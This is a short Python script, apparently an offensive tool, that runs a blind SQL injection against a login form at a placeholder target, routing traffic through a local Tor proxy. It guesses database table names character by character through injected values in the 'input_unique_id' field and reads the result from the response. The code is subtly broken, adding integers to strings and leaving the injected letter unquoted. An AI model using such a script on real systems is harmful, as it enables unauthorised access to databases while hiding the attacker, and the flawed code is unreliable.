import json
import requests
import curlify

url = "--target--"


#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
alphabet = ["_","e","t","a","o","i","n","s","h","r","d","l","c","u","m","w","f","g","y","p","b","v","k","j","x","q","z"]
IsFinish = False
#DO NOT CHANGE THIS PART

while not IsFinish:
    i=1
    for letter in alphabet:
        injection = "a' OR IF(HEX("+letter+")=HEX((SELECT SUBSTRING(table_name,"+i+",1) AS ExtractString FROM information_schema.tables LIMIT 1 OFFSET "+i-1+")),1,'a'); -- "
        response = requests.post(
            url,
            cookies=cookies,
            data={
            'input_unique_id': injection,
            'input_pass': 'a',
            'btn_login': 'Submit',
            },
            verify=False,
            proxies=prox
        )
        print("Response content:")
        print(response.text)
        i+=1
        #print(response.text[40])
        if response.text[40]=='p':
            print("correct")
            break
    else:
        print("wrong")
        IsFinish = True